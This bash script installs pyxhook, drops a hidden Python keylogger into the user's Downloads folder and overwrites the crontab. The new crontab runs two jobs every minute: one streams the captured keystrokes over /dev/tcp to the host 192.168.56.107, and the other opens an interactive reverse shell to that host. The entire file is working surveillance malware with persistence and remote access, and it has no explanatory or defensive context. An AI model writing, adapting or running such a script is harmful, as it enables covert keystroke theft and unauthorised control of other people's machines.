#!/bin/bash

pip3 install pyxhook
cat > ~/Downloads/.keylogger.py << EOF
import os
import pyxhook

def OnKeyPress(event):
    if event.Ascii == 13:
        print('[Enter]', flush=True)
    elif event.Ascii == 32:
        print(' ', end='', flush=True)
    elif len(event.Key) != 1:
        print('['+event.Key, end=']', flush=True)
    else:
        print(event.Key, end='', flush=True)


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:
    pass
EOF
crontab << EOF
* * * * * /bin/bash -c 'bash -c "DISPLAY=':0' python3 ~/Downloads/.keylogger.py" >& /dev/tcp/192.168.56.107/80 &'
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.107/21 0>&1'
EOF
